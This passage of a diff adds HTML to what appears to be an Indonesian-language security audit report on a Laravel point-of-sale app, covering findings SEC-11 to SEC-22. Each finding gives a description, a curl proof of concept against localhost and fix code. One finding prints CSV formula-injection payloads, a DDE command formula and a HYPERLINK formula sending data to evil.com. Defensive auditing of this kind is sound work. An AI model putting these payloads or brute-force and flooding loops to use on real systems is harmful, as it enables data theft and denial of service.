+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Memeriksa respon HTTP header saat membuat sesi login:
+curl -i http://localhost/masuk | grep -i Set-Cookie
+
+# Output:
+# Set-Cookie: toko_firo_session=eyJpdiI...; expires=...; Max-Age=7200; path=/; httponly; samesite=lax
+# [!] Atribut &#x27;Secure&#x27; tidak tercantum pada instruksi pembuatan cookie peramban.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code># .env (Lingkungan Produksi)
+# Wajibkan flag Secure pada seluruh cookie sesi yang diterbitkan aplikasi:
+SESSION_SECURE_COOKIE=true</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-11 -->
+      <article class="finding-card" id="SEC-11">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-11</span>
+            <span class="severity-badge sev-high">Tinggi (HIGH)</span>
+            <span class="cwe-tag">CWE-362 / CWE-312 / CWE-307</span>
+          </div>
+          <h2 class="finding-title">Kelemahan Arsitektur 2FA/OTP (Race Condition, Plaintext Cache, Cooldown Bypass)</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Services/OtpService.php (baris 15-38), app/Http/Controllers/LoginController.php (baris 48-56)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Implementasi autentikasi dua faktor (OTP Telegram) memiliki tiga kelemahan kritis:
+1. Race Condition Verifikasi: Pada OtpService::verify, pengecekan dan kenaikan jumlah percobaan gagal menggunakan Cache::get lalu Cache::put secara terpisah. Penyerang dapat mengirimkan request paralel secara serentak sehingga batas 5x percobaan terlewati sebelum counter terupdate (brute-force race condition).
+2. Penyimpanan OTP Plaintext: Kode 6 digit disimpan dalam bentuk teks terang di cache basis data (Cache::put(&#x27;otp:login:{$userId}&#x27;, $code)).
+3. Bypass Cooldown Pengiriman Ulang: LoginController::authenticate langsung mengeksekusi $otp-&gt;generate() setiap kali POST /masuk dikirimkan tanpa memeriksa status cooldown 90 detik (canResend()), memungkinkan spam OTP ke Telegram.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Mengirim 15 permintaan verifikasi OTP secara paralel (concurrency race condition):
+for i in {100000..100015}; do
+    curl -s -X POST http://localhost/verifikasi -d &quot;code=$i&quot; -b &quot;cookies.txt&quot; &amp;
+done
+wait
+# Counter percobaan tidak bertambah secara konsisten dan batas 5 percobaan dapat dilewati.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// app/Services/OtpService.php
+// 1. Simpan OTP dalam bentuk hash kriptografis:
+Cache::put(&quot;otp:login:{$userId}&quot;, hash(&#x27;sha256&#x27;, $code), self::TTL);
+
+// 2. Gunakan operasi atomik Cache::increment untuk menghitung percobaan gagal:
+$attempts = Cache::increment(&quot;otp:attempts:{$userId}&quot;);
+if ($attempts &gt; self::MAX_ATTEMPTS) {
+    $this-&gt;invalidate($userId);
+    return &#x27;max_attempts&#x27;;
+}
+
+// 3. Pada LoginController, validasi canResend() sebelum menerbitkan OTP baru.</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-12 -->
+      <article class="finding-card" id="SEC-12">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-12</span>
+            <span class="severity-badge sev-high">Tinggi (HIGH)</span>
+            <span class="cwe-tag">CWE-345 / CWE-290</span>
+          </div>
+          <h2 class="finding-title">Konfigurasi trustProxies Wildcard (&#x27;*&#x27;) Memungkinkan Pemalsuan Alamat IP Klien</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">bootstrap/app.php (baris 27)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Deklarasi &#x27;$middleware-&gt;trustProxies(at: &#x27;*&#x27;)&#x27; menginstruksikan aplikasi untuk mempercayai seluruh header proksi HTTP (X-Forwarded-For, X-Forwarded-Proto) yang dikirim oleh siapa pun dari internet publik. Penyerang dapat dengan mudah memalsukan identitas alamat IP mereka dengan menyuntikkan header X-Forwarded-For palsu. Dampaknya, catatan audit trail pada tabel log_aktivitas akan mencatat IP palsu, serta mekanisme pembatasan laju request (rate limiter/throttle) dapat dilewati dengan mengubah header IP pada setiap request.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Mengirim permintaan HTTP dengan header X-Forwarded-For palsu:
+curl -H &quot;X-Forwarded-For: 8.8.8.8&quot; http://localhost/masuk
+
+# Pemeriksaan log aplikasi membuktikan server mencatat alamat IP klien sebagai &#x27;8.8.8.8&#x27;
+# alih-alih IP koneksi TCP penyerang yang sebenarnya.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// bootstrap/app.php
+// Tentukan IP reverse proxy internal (misal Nginx / AWS ALB) secara spesifik:
+$middleware-&gt;trustProxies(at: [
+    &#x27;127.0.0.1&#x27;,
+    &#x27;10.0.0.0/8&#x27;, // Subnet VPC internal
+]);</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-13 -->
+      <article class="finding-card" id="SEC-13">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-13</span>
+            <span class="severity-badge sev-medium">Sedang (MEDIUM)</span>
+            <span class="cwe-tag">CWE-400 / CWE-306</span>
+          </div>
+          <h2 class="finding-title">Pemicu Eksekusi Pencadangan Database Tanpa Autentikasi via HTTP GET (Risiko DoS)</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Http/Controllers/Admin/BackupController.php (baris 22-26), routes/admin_backup.php</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Pada BackupController::index, controller secara otomatis memanggil prosesBackup() jika parameter kueri &#x27;action=backup&#x27; disertakan dalam URL GET. Karena rute admin tidak diproteksi autentikasi (SEC-01), siapapun dapat memicu proses pencadangan basis data, pembuatan dump SQL, kompresi AES-256 berkas ZIP, dan penyimpanan ke disk server hanya dengan merefresh tautan URL. Penyerang dapat melakukan Denial of Service (DoS) melalui penghabisan ruang penyimpanan (disk exhaustion) dan pemakaian CPU yang tinggi.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Menjalankan pencadangan berulang kali melalui permintaan GET publik:
+for i in {1..20}; do
+    curl -s &quot;http://localhost/admin/backup?action=backup&quot; &gt; /dev/null
+done
+# Hasil: Tercipta 20 file arsip cadangan basis data (.zip) baru di direktori penyimpanan server.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// app/Http/Controllers/Admin/BackupController.php
+// Hapus eksekusi mutasi pencadangan dari metode index() GET:
+public function index(Request $request): View
+{
+    $riwayatBackup = $this-&gt;backupService-&gt;getRiwayatBackup(10);
+    return view(&#x27;admin.backup.index&#x27;, compact(&#x27;riwayatBackup&#x27;));
+}
+// Cadangan hanya boleh dipicu melalui rute POST dengan token CSRF dan hak akses admin.</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-14 -->
+      <article class="finding-card" id="SEC-14">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-14</span>
+            <span class="severity-badge sev-medium">Sedang (MEDIUM)</span>
+            <span class="cwe-tag">CWE-639 / CWE-284</span>
+          </div>
+          <h2 class="finding-title">Kerentanan IDOR pada Rute Detail dan Cetak Struk Penjualan Tanpa Autentikasi</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">routes/kasir_transaksi.php (baris 21-22), app/Http/Controllers/Kasir/TransaksiKasirController.php</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Endpoint cetak dan detail nota transaksi (/kasir/transaksi/{nota}/detail dan /kasir/transaksi/{nota}/cetak) tidak dilengkapi middleware autentikasi dan tidak memvalidasi izin akses pengguna. Nomor nota transaksi Toko Firo memiliki pola berurutan dan mudah ditebak (TRX-YYYYMMDD-XXXX). Pihak luar dapat melakukan penomoran berurutan (Insecure Direct Object Reference / IDOR) untuk mengunduh seluruh struk transaksi pelanggan, melihat riwayat pembelian, nomor meja/pelanggan, nama kasir, dan data omzet toko.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Enumerasi nota transaksi tanpa otentikasi:
+curl -s http://localhost/kasir/transaksi/TRX-20261031-0001/detail | grep -o &#x27;&quot;total_bayar&quot;:[^,]*&#x27;
+curl -s http://localhost/kasir/transaksi/TRX-20261031-0002/cetak | head -n 30
+# Hasil: Seluruh data struk pelanggan tampil tanpa perlu autentikasi.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// routes/kasir_transaksi.php
+Route::middleware([&#x27;auth&#x27;, &#x27;role:KASIR,ADMIN&#x27;])-&gt;group(function () {
+    Route::get(&#x27;/kasir/transaksi/{nota}/detail&#x27;, [TransaksiKasirController::class, &#x27;detail&#x27;])-&gt;name(&#x27;kasir.transaksi.detail&#x27;);
+    Route::get(&#x27;/kasir/transaksi/{nota}/cetak&#x27;, [TransaksiKasirController::class, &#x27;cetakStruk&#x27;])-&gt;name(&#x27;kasir.transaksi.cetak&#x27;);
+});</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-15 -->
+      <article class="finding-card" id="SEC-15">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-15</span>
+            <span class="severity-badge sev-medium">Sedang (MEDIUM)</span>
+            <span class="cwe-tag">CWE-1236</span>
+          </div>
+          <h2 class="finding-title">Kerentanan CSV Formula Injection (CWE-1236) pada Fitur Ekspor Log Aktivitas</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Services/LogAktivitasService.php (baris 139-157)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Pada LogAktivitasService::eksporCsv, nilai kolom keterangan digabungkan langsung ke dalam baris file CSV tanpa melakukan netralisasi terhadap karakter inisial rumus spreadsheet (=, +, -, @, \t, \r). Jika penyerang memasukkan data (misalnya saat mengubah nama barang atau input transaksi) yang dimulai dengan simbol tersebut, aplikasi spreadsheet seperti Microsoft Excel atau LibreOffice Calc akan mengeksekusinya sebagai rumus otomatis saat file CSV dibuka oleh administrator, memungkinkan pencurian data atau eksekusi perintah sistem (DDE attack).</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Penyerang menyisipkan nama barang atau aksi log berisi muatan formula:
+# Keterangan Log: =cmd|&#x27;/C calc&#x27;!A0 atau =HYPERLINK(&quot;http://evil.com/leak?d=&quot;&amp;A1,&quot;Unduh Patch&quot;)
+# Administrator mengunduh CSV log dari /admin/log-aktivitas/ekspor-csv.
+# Saat berkas dibuka di Microsoft Excel, Excel memicu kalkulasi formula eksternal dinamis.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// app/Services/LogAktivitasService.php (eksporCsv)
+// Tambahkan penanganan netralisasi formula spreadsheet:
+$formulaChars = [&#x27;=&#x27;, &#x27;+&#x27;, &#x27;-&#x27;, &#x27;@&#x27;, &quot;\t&quot;, &quot;\r&quot;];
+if (in_array(substr($ket, 0, 1), $formulaChars, true)) {
+    $ket = &quot;&#x27;&quot; . $ket;
+}</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-16 -->
+      <article class="finding-card" id="SEC-16">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-16</span>
+            <span class="severity-badge sev-medium">Sedang (MEDIUM)</span>
+            <span class="cwe-tag">CWE-284 / CWE-400</span>
+          </div>
+          <h2 class="finding-title">Ketiadaan Validasi Alamat IP Telegram Webhook &amp; Potensi DoS Pembuatan PDF Sinkron</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Http/Controllers/TelegramWebhookController.php (baris 21-67, 443-460)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Pengontrol webhook Telegram hanya memverifikasi rahasia X-Telegram-Bot-Api-Secret-Token tanpa memeriksa apakah alamat IP pemanggil request berasal dari rentang CIDR resmi server Telegram (149.154.160.0/20 dan 91.108.4.0/22). Selain itu, saat menangani perintah &#x27;/laporan&#x27; atau kata kunci laporan penjualan, controller menghasilkan berkas PDF penjualan secara sinkron (blocking) dalam proses request HTTP utama. Jika webhook diserang oleh request bertubi-tubi, seluruh worker proses PHP-FPM akan tertahan merender PDF, menyebabkan server tidak merespons request pengguna lain.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Mengirimkan 10 permintaan webhook simultan pemicu pembuatan PDF:
+for i in {1..10}; do
+    curl -s -X POST http://localhost/api/telegram/webhook \
+        -H &quot;X-Telegram-Bot-Api-Secret-Token: &lt;SECRET&gt;&quot; \
+        -H &quot;Content-Type: application/json&quot; \
+        -d &#x27;{&quot;message&quot;:{&quot;chat&quot;:{&quot;id&quot;:-1001234567890},&quot;text&quot;:&quot;/laporan&quot;}}&#x27; &amp;
+done
+# Hasil: Penggunaan CPU melonjak dan waktu respon aplikasi terhambat.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// 1. Validasi subnet IP Telegram pada middleware webhook:
+$telegramIpRanges = [&#x27;149.154.160.0/20&#x27;, &#x27;91.108.4.0/22&#x27;];
+if (! \Symfony\Component\HttpFoundation\IpUtils::checkIp($request-&gt;ip(), $telegramIpRanges)) {
+    abort(403, &#x27;Akses Ditolak: Bukan IP resmi Telegram&#x27;);
+}
+
+// 2. Alihkan proses pembuatan PDF ke antrean latar belakang (Queue Worker):
+\App\Jobs\KirimLaporanPdfTelegramJob::dispatch($chatId);</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-17 -->
+      <article class="finding-card" id="SEC-17">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-17</span>
+            <span class="severity-badge sev-medium">Sedang (MEDIUM)</span>
+            <span class="cwe-tag">CWE-942</span>
+          </div>
+          <h2 class="finding-title">Kebijakan Cross-Origin Resource Sharing (CORS) Terlalu Longgar (Wildcard Allowed Origins)</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">config/cors.php (atau konfigurasi default framework)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Konfigurasi standar CORS mengizinkan asal permintaan lintas domain dari mana saja (allowed_origins = [&#x27;*&#x27;]). Meskipun API internal menggunakan autentikasi, pengaturan wildcard pada aplikasi POS internal membuka celah bagi skrip dari situs luar yang dibuka oleh kasir atau admin untuk berinteraksi dengan API internal aplikasi Toko Firo.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Mengirim permintaan OPTIONS pre-flight dengan origin asing:
+curl -H &quot;Origin: http://malicious-site.com&quot; -H &quot;Access-Control-Request-Method: POST&quot; \
+     -I http://localhost/api/transaksi
+# Respon memuat:
+# Access-Control-Allow-Origin: *</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// config/cors.php
+&#x27;allowed_origins&#x27; =&gt; [env(&#x27;APP_URL&#x27;, &#x27;http://localhost&#x27;)],
+&#x27;allowed_origins_patterns&#x27; =&gt; [],
+&#x27;supports_credentials&#x27; =&gt; false,</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-18 -->
+      <article class="finding-card" id="SEC-18">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-18</span>
+            <span class="severity-badge sev-low">Rendah (LOW)</span>
+            <span class="cwe-tag">CWE-670 / CWE-284</span>
+          </div>
+          <h2 class="finding-title">Pemeriksaan Autentikasi Ad-hoc Tidak Berfungsi Akibat Perbedaan Nama Rute Stok Kasir</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Http/Controllers/Kasir/StokKasirController.php (baris 26-28), routes/kasir_stok.php (baris 16)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Pada StokKasirController::index, pengembang menambahkan logika proteksi ad-hoc: &#x27;if ($request-&gt;routeIs(&#x27;kasir.stok.index&#x27;) &amp;&amp; !auth()-&gt;check()) { return redirect()-&gt;guest(route(&#x27;login&#x27;)); }&#x27;. Namun pada routes/kasir_stok.php, rute tersebut didaftarkan dengan nama &#x27;kasir.stok&#x27;, bukan &#x27;kasir.stok.index&#x27;. Akibatnya fungsi routeIs() selalu bernilai FALSE, sehingga logika pengalihan login tidak pernah dieksekusi (inert check).</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Buka browser dalam mode incognito tanpa login dan buka /kasir/stok:
+# Pengguna tidak dialihkan ke /login karena evaluasi $request-&gt;routeIs(&#x27;kasir.stok.index&#x27;) selalu false.
+# Halaman stok barang tetap terbuka secara penuh.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// Hapus pengecekan ad-hoc dari controller, dan letakkan middleware resmi di level rute:
+// routes/kasir_stok.php
+Route::middleware([&#x27;auth&#x27;, &#x27;role:KASIR&#x27;])-&gt;group(function () {
+    Route::get(&#x27;/kasir/stok&#x27;, [StokKasirController::class, &#x27;index&#x27;])-&gt;name(&#x27;kasir.stok&#x27;);
+});</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-19 -->
+      <article class="finding-card" id="SEC-19">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-19</span>
+            <span class="severity-badge sev-low">Rendah (LOW)</span>
+            <span class="cwe-tag">CWE-20</span>
+          </div>
+          <h2 class="finding-title">Ketiadaan Validasi Whitelist Kunci Pengaturan pada Method Toggle NotifikasiController</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Http/Controllers/Admin/NotifikasiController.php (baris 101-125)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Method toggle() pada NotifikasiController menerima parameter &#x27;kunci&#x27; dari pengguna dan langsung menyimpannya ke tabel pengaturan melalui stored procedure sp_set_setting(?, ?, ?) tanpa memvalidasi apakah parameter kunci tersebut terdaftar pada whitelist kunci notifikasi yang sah. Administrator dapat menyuntikkan kunci konfigurasi arbitrer ke dalam basis data sistem.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Mengirim permintaan POST toggle dengan kunci di luar spesifikasi:
+curl -X POST http://localhost/admin/pengaturan-notifikasi/toggle \
+     -d &quot;kunci=unauthorized_arbitrary_key&amp;nilai=1&quot;
+# Respon HTTP 302/200; baris pengaturan baru berhasil tercatat di tabel konfigurasi.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// app/Http/Controllers/Admin/NotifikasiController.php (toggle)
+$allowedKeys = [
+    &#x27;laporan_otomatis&#x27;, &#x27;notif_stok_minimum&#x27;, &#x27;notif_item_baru&#x27;, &#x27;notif_backup&#x27;, &#x27;notif_otp&#x27;
+];
+$request-&gt;validate([
+    &#x27;kunci&#x27; =&gt; [&#x27;required&#x27;, &#x27;string&#x27;, \Illuminate\Validation\Rule::in($allowedKeys)],
+    &#x27;nilai&#x27; =&gt; [&#x27;required&#x27;, &#x27;in:0,1&#x27;],
+]);</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-20 -->
+      <article class="finding-card" id="SEC-20">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-20</span>
+            <span class="severity-badge sev-low">Rendah (LOW)</span>
+            <span class="cwe-tag">CWE-1188 / CWE-706</span>
+          </div>
+          <h2 class="finding-title">Keberadaan Kode Usang AuthController dengan 1-Step Login Tanpa 2FA (Dead Code Risk)</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Http/Controllers/AuthController.php</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Controller AuthController.php memuat mekanisme autentikasi 1 langkah konvensional (Auth::attempt) tanpa melewati alur verifikasi dua faktor (Telegram OTP). Kode ini merupakan artefak pengembangan awal yang tidak lagi digunakan pada routes/web.php. Keberadaan kode mati (dead code) ini dapat menimbulkan celah bypass 2FA jika di masa mendatang seorang pengembang secara keliru mendaftarkannya kembali ke routing.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Pemeriksaan kode sumber menunjukkan fungsi AuthController::login() masih aktif secara mandiri:
+# Jika rute sementara dipetakan ke AuthController@login, autentikasi 2FA dapat di-bypass sepenuhnya.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// Hapus berkas pengendali usang tersebut dari repositori git:
+// git rm app/Http/Controllers/AuthController.php</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-21 -->
+      <article class="finding-card" id="SEC-21">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-21</span>
+            <span class="severity-badge sev-low">Rendah (LOW)</span>
+            <span class="cwe-tag">CWE-285</span>
+          </div>
+          <h2 class="finding-title">Ketiadaan Proteksi Hirarki Akun Admin / Superadmin pada PenggunaController</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Http/Controllers/Admin/PenggunaController.php (baris 90-140)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Sistem kelola staf tidak memiliki pembatasan hirarki akun. Setiap akun dengan peran ADMIN memiliki derajat wewenang yang setara dan dapat mengubah data, mengganti kata sandi, atau menonaktifkan akun admin pemilik toko utama (id_pengguna = 1). Selain itu, sistem tidak mencegah admin menonaktifkan akunnya sendiri, yang dapat mengakibatkan kondisi terkunci (lockout) di mana toko kehilangan seluruh akses administrator.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Staf admin biasa mengirim request untuk menonaktifkan akun pemilik toko (ID 1):
+curl -X POST http://localhost/admin/pengguna/1/status -d &quot;status=NONAKTIF&quot;
+# Akun superadmin utama dinonaktifkan tanpa peringatan.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// app/Http/Controllers/Admin/PenggunaController.php
+if ($id === 1 &amp;&amp; strtoupper($validated[&#x27;status&#x27;]) === &#x27;NONAKTIF&#x27;) {
+    return back()-&gt;withErrors([&#x27;status&#x27; =&gt; &#x27;Akun Administrator Pemilik Toko tidak dapat dinonaktifkan.&#x27;]);
+}
+if ($id === Auth::id() &amp;&amp; strtoupper($validated[&#x27;status&#x27;]) === &#x27;NONAKTIF&#x27;) {
+    return back()-&gt;withErrors([&#x27;status&#x27; =&gt; &#x27;Anda tidak dapat menonaktifkan akun Anda sendiri.&#x27;]);
+}</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-22 -->
+      <article class="finding-card" id="SEC-22">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-22</span>
+            <span class="severity-badge sev-low">Rendah (LOW)</span>
+            <span class="cwe-tag">CWE-915</span>
+          </div>
+          <h2 class="finding-title">Kolom Sensitif Dideklarasikan dalam Properti $fillable Model Eloquent</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Models/User.php (baris 25-31), app/Models/Pengguna.php (baris 37-45)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
